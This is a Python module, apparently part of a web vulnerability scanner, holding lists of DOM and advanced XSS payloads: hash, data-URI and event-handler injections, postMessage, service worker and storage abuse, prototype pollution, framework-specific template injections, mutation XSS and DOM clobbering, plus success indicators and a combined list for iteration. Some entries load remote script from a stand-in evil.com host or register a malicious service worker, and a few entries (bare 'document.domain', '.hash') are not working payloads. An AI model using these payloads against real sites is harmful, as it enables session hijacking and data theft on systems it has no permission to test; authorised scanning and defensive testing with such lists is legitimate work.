"""
DOM XSS and Advanced XSS Payloads

Additional DOM XSS and advanced XSS vectors
"""

# DOM XSS via hash fragments
DOM_HASH_XSS = [
    {
        "name": "img_hash",
        "payload": "#<img src=x onerror=alert(1)>",
        "description": "DOM XSS via hash fragment",
    },
    {
        "name": "body_hash",
        "payload": "#<body onload=alert(1)>",
        "description": "Body tag hash injection",
    },
    {
        "name": "svg_hash",
        "payload": "#<svg onload=alert(1)>",
        "description": "SVG hash injection",
    },
]

# DOM XSS via location.hash
DOM_LOCATION_XSS = [
    {
        "name": "location_hash",
        "payload": "javascript:/*--><img src=x onerror=alert(1)>",
        "description": "Location hash DOM XSS",
    },
    {
        "name": "location_dot",
        "payload": ".hash",
        "description": "Location property access",
    },
]

# Self-closing tag DOM XSS
DOM_SELF_CLOSING = [
    {
        "name": "self_closing_img",
        "payload": "<img/src=x onerror=alert(1)>.hash",
        "description": "Self-closing img with hash",
    },
    {
        "name": "self_closing_iframe",
        "payload": "<iframe/srcdoc=\"<script>alert(1)</script>\">.hash",
        "description": "Self-closing iframe",
    },
]

# Data URI XSS for DOM
DOM_DATA_URI = [
    {
        "name": "data_uri_script",
        "payload": "data:text/html,<script>alert(1)</script>",
        "description": "Data URI script injection",
    },
    {
        "name": "data_uri_html",
        "payload": "data:text/html,<img src=x onerror=alert(1)>",
        "description": "Data URI HTML injection",
    },
]

# Module namespace XSS
MODULE_NAMESPACE_XSS = [
    {
        "name": "svg_module",
        "payload": "<svg><script>alert(1)</script></svg>",
        "description": "SVG module namespace XSS",
    },
    {
        "name": "math_module",
        "payload": "<math><mtext><script>alert(1)</script></mtext></math>",
        "description": "Math namespace MXSS",
    },
]

# Attribute-based DOM XSS
DOM_ATTRIBUTE_XSS = [
    {
        "name": "id_attribute",
        "payload": "<img id=x name=y>",
        "description": "ID attribute DOM polluting",
    },
    {
        "name": "name_attribute",
        "payload": "<input name=attributes>",
        "description": "Name attribute pollution",
    },
    {
        "name": "formaction_bypass",
        "payload": "<input type=submit formaction=javascript:alert(1)>",
        "description": "Formaction XSS",
    },
]

# Event-based DOM XSS (advanced)
DOM_EVENT_ADVANCED = [
    {
        "name": "onscroll",
        "payload": "<div onscroll=alert(1) style='height:9999px'>scroll</div>",
        "description": "Onscroll event XSS",
    },
    {
        "name": "onresize",
        "payload": "<div onresize=alert(1) style='height:9999px'>resize</div>",
        "description": "Onresize event XSS",
    },
    {
        "name": "ondrag",
        "payload": "<img src=x ondrag=alert(1) draggable=true>",
        "description": "Ondrag event XSS",
    },
    {
        "name": "ondrop",
        "payload": "<div ondrop=alert(1)>drop here</div>",
        "description": "Ondrop event XSS",
    },
]

# JavaScript protocol for DOM
DOM_JS_PROTOCOL = [
    {
        "name": "javascript_protocol",
        "payload": "javascript:/*--><img src=x onerror=alert(1)>",
        "description": "JavaScript protocol injection",
    },
    {
        "name": "vbscript_protocol",
        "payload": "vbscript:alert(1)",
        "description": "VBScript protocol",
    },
    {
        "name": "data_protocol",
        "payload": "data:text/html,<script>alert(1)</script>",
        "description": "Data protocol",
    },
]

# CSS-based DOM XSS
DOM_CSS_XSS = [
    {
        "name": "expression",
        "payload": "<div style='xss:expression(alert(1))'>test</div>",
        "description": "CSS expression XSS",
    },
    {
        "name": "behavior",
        "payload": "<div style='behavior:url(xss.htc)'>test</div>",
        "description": "CSS behavior XSS",
    },
    {
        "name": "binding",
        "payload": "<div style='binding:url(xss.xml)'>test</div>",
        "description": "CSS binding XSS",
    },
]

# Template literal XSS
DOM_TEMPLATE_LITERAL = [
    {
        "name": "backtick",
        "payload": "`<script>alert(1)</script>`",
        "description": "Template literal with backticks",
    },
    {
        "name": "dollar_curly",
        "payload": "${alert(1)}",
        "description": "Template literal ${}",
    },
]

# DOM sink poisoning
DOM_SINK_POISON = [
    {
        "name": "document_domain",
        "payload": "document.domain",
        "description": "Document domain sink",
    },
    {
        "name": "window_location",
        "payload": "window.location",
        "description": "Window location sink",
    },
    {
        "name": "parent_location",
        "payload": "parent.location",
        "description": "Parent location sink",
    },
    {
        "name": "top_location",
        "payload": "top.location",
        "description": "Top location sink",
    },
]

# DOM-based payload fragments
DOM_FRAGMENT_XSS = [
    {
        "name": "hash_fragment",
        "payload": "#<img src=x onerror=alert(1)>",
        "fragment_type": "hash",
    },
    {
        "name": "search_fragment",
        "payload": "?<script>alert(1)</script>",
        "fragment_type": "search",
    },
]

# Success indicators for DOM XSS
DOM_XSS_SUCCESS = [
    "alert(1)",
    "prompt(1)",
    "confirm(1)",
    "<script>",
    "javascript:",
    "onerror=",
    "onload=",
    "expression(",
]

# postMessage exploitation payloads
POSTMESSAGE_XSS = [
    {
        "name": "postmessage_basic",
        "payload": "window.postMessage('<img src=x onerror=alert(1)>', '*')",
        "description": "Basic postMessage XSS",
    },
    {
        "name": "postmessage_origin_bypass",
        "payload": "window.postMessage({type:'xss',data:'<script>alert(1)</script>'}, '*')",
        "description": "postMessage with wildcard origin",
    },
    {
        "name": "postmessage_json",
        "payload": "window.postMessage(JSON.stringify({callback:'alert(1)'}), '*')",
        "description": "postMessage JSON injection",
    },
    {
        "name": "postmessage_eval",
        "payload": "window.postMessage('eval(atob(\"YWxlcnQoMSk=\"))', '*')",
        "description": "postMessage with base64 eval",
    },
    {
        "name": "postmessage_iframe",
        "payload": "<iframe onload=\"this.contentWindow.postMessage('<img/src/onerror=alert(1)>','*')\">",
        "description": "postMessage via iframe",
    },
]

# WebSocket URL injection
WEBSOCKET_XSS = [
    {
        "name": "ws_javascript",
        "payload": "javascript:alert(1)//ws://",
        "description": "JavaScript protocol in WebSocket URL",
    },
    {
        "name": "ws_data_uri",
        "payload": "data:text/html,<script>alert(1)</script>//ws://",
        "description": "Data URI in WebSocket context",
    },
    {
        "name": "ws_url_injection",
        "payload": "ws://evil.com/socket?callback=<script>alert(1)</script>",
        "description": "XSS in WebSocket URL parameter",
    },
    {
        "name": "wss_bypass",
        "payload": "wss://evil.com\\.target.com/",
        "description": "WebSocket origin bypass",
    },
]

# Service Worker abuse
SERVICE_WORKER_XSS = [
    {
        "name": "sw_registration",
        "payload": "navigator.serviceWorker.register('/evil.js')",
        "description": "Malicious Service Worker registration",
    },
    {
        "name": "sw_scope_bypass",
        "payload": "navigator.serviceWorker.register('evil.js', {scope: '/'})",
        "description": "Service Worker scope manipulation",
    },
    {
        "name": "sw_cache_poison",
        "payload": "caches.open('v1').then(c=>c.put('/',new Response('<script>alert(1)</script>')))",
        "description": "Service Worker cache poisoning",
    },
]

# Storage-based XSS (localStorage/sessionStorage/IndexedDB)
STORAGE_XSS = [
    {
        "name": "localstorage_inject",
        "payload": "localStorage.setItem('user','<img src=x onerror=alert(1)>')",
        "description": "localStorage injection",
    },
    {
        "name": "sessionstorage_inject",
        "payload": "sessionStorage.setItem('data','<script>alert(1)</script>')",
        "description": "sessionStorage injection",
    },
    {
        "name": "indexeddb_inject",
        "payload": "indexedDB.open('db').onsuccess=function(e){e.target.result.transaction('store').objectStore('store').put({xss:'<img src=x onerror=alert(1)>'})}",
        "description": "IndexedDB injection",
    },
    {
        "name": "cookie_based_dom",
        "payload": "document.cookie='user=<img src=x onerror=alert(1)>'",
        "description": "Cookie-based DOM XSS",
    },
]

# Prototype pollution leading to DOM XSS
PROTOTYPE_POLLUTION_XSS = [
    {
        "name": "proto_innerhtml",
        "payload": "Object.prototype.innerHTML='<img src=x onerror=alert(1)>'",
        "description": "Prototype pollution to innerHTML",
    },
    {
        "name": "proto_srcdoc",
        "payload": "Object.prototype.srcdoc='<script>alert(1)</script>'",
        "description": "Prototype pollution to srcdoc",
    },
    {
        "name": "proto_url",
        "payload": "Object.prototype.url='javascript:alert(1)'",
        "description": "Prototype pollution to URL property",
    },
    {
        "name": "constructor_proto",
        "payload": "constructor.prototype.innerHTML='<img src=x onerror=alert(1)>'",
        "description": "Constructor prototype pollution",
    },
]

# Angular-specific XSS
ANGULAR_XSS = [
    {
        "name": "angular_expression",
        "payload": "{{constructor.constructor('alert(1)')()}}",
        "description": "Angular template expression",
    },
    {
        "name": "angular_1x",
        "payload": "{{$on.constructor('alert(1)')()}}",
        "description": "Angular 1.x sandbox escape",
    },
    {
        "name": "angular_orderby",
        "payload": "{{orderBy:[].constructor.constructor('alert(1)')()}}",
        "description": "Angular orderBy filter abuse",
    },
    {
        "name": "angular_ng_init",
        "payload": "<div ng-app ng-init=\"constructor.constructor('alert(1)')())\">",
        "description": "ng-init directive XSS",
    },
    {
        "name": "angular_ng_include",
        "payload": "<div ng-app><div ng-include=\"'http://evil.com/xss.html'\"></div></div>",
        "description": "ng-include remote template",
    },
]

# React-specific XSS
REACT_XSS = [
    {
        "name": "react_dangerously",
        "payload": "<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}/>",
        "description": "React dangerouslySetInnerHTML",
    },
    {
        "name": "react_href",
        "payload": "<a href=\"javascript:alert(1)\">click</a>",
        "description": "React href javascript protocol",
    },
    {
        "name": "react_ssr_hydration",
        "payload": "__NEXT_DATA__={\"props\":{\"pageProps\":{\"xss\":\"<script>alert(1)</script>\"}}}",
        "description": "React/Next.js SSR hydration",
    },
]

# Vue-specific XSS
VUE_XSS = [
    {
        "name": "vue_template",
        "payload": "{{_c.constructor('alert(1)')()}}",
        "description": "Vue template injection",
    },
    {
        "name": "vue_v_html",
        "payload": "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
        "description": "Vue v-html directive",
    },
    {
        "name": "vue_compile",
        "payload": "Vue.compile('<img src=x onerror=alert(1)>')",
        "description": "Vue.compile injection",
    },
    {
        "name": "vue_ssr",
        "payload": "__NUXT__={data:[{xss:'<script>alert(1)</script>'}]}",
        "description": "Nuxt.js SSR injection",
    },
]

# jQuery-specific XSS
JQUERY_XSS = [
    {
        "name": "jquery_html",
        "payload": "$('div').html('<img src=x onerror=alert(1)>')",
        "description": "jQuery .html() injection",
    },
    {
        "name": "jquery_append",
        "payload": "$('body').append('<script>alert(1)</script>')",
        "description": "jQuery .append() injection",
    },
    {
        "name": "jquery_selector",
        "payload": "$('<img src=x onerror=alert(1)>')",
        "description": "jQuery selector injection",
    },
    {
        "name": "jquery_globaleval",
        "payload": "$.globalEval('alert(1)')",
        "description": "jQuery globalEval",
    },
    {
        "name": "jquery_getscript",
        "payload": "$.getScript('http://evil.com/xss.js')",
        "description": "jQuery getScript",
    },
]

# Mutation XSS (mXSS)
MUTATION_XSS = [
    {
        "name": "mxss_noscript",
        "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "description": "mXSS via noscript",
    },
    {
        "name": "mxss_textarea",
        "payload": "<textarea><img src=x onerror=alert(1)></textarea>",
        "description": "mXSS via textarea reparse",
    },
    {
        "name": "mxss_style",
        "payload": "<style><img src=x onerror=alert(1)//</style>",
        "description": "mXSS via style tag",
    },
    {
        "name": "mxss_svg_foreignobject",
        "payload": "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
        "description": "mXSS via SVG foreignObject",
    },
    {
        "name": "mxss_math_annotation",
        "payload": "<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>",
        "description": "mXSS via MathML annotation",
    },
]

# DOM clobbering
DOM_CLOBBERING = [
    {
        "name": "clobber_forms",
        "payload": "<form id=x><input id=y></form><form id=x><input id=y>",
        "description": "Form DOM clobbering",
    },
    {
        "name": "clobber_anchor",
        "payload": "<a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"javascript:alert(1)\">",
        "description": "Anchor clobbering",
    },
    {
        "name": "clobber_window",
        "payload": "<img name=location><img name=location src=x onerror=alert(1)>",
        "description": "Window property clobbering",
    },
    {
        "name": "clobber_document",
        "payload": "<form id=document><input id=domain value=evil.com>",
        "description": "Document clobbering",
    },
]

# Combined payload list for easy iteration
ALL_DOM_XSS_PAYLOADS = (
    DOM_HASH_XSS +
    DOM_LOCATION_XSS +
    DOM_SELF_CLOSING +
    DOM_DATA_URI +
    MODULE_NAMESPACE_XSS +
    DOM_ATTRIBUTE_XSS +
    DOM_EVENT_ADVANCED +
    DOM_JS_PROTOCOL +
    DOM_CSS_XSS +
    DOM_TEMPLATE_LITERAL +
    DOM_SINK_POISON +
    DOM_FRAGMENT_XSS +
    POSTMESSAGE_XSS +
    WEBSOCKET_XSS +
    SERVICE_WORKER_XSS +
    STORAGE_XSS +
    PROTOTYPE_POLLUTION_XSS +
    ANGULAR_XSS +
    REACT_XSS +
    VUE_XSS +
    JQUERY_XSS +
    MUTATION_XSS +
    DOM_CLOBBERING
)
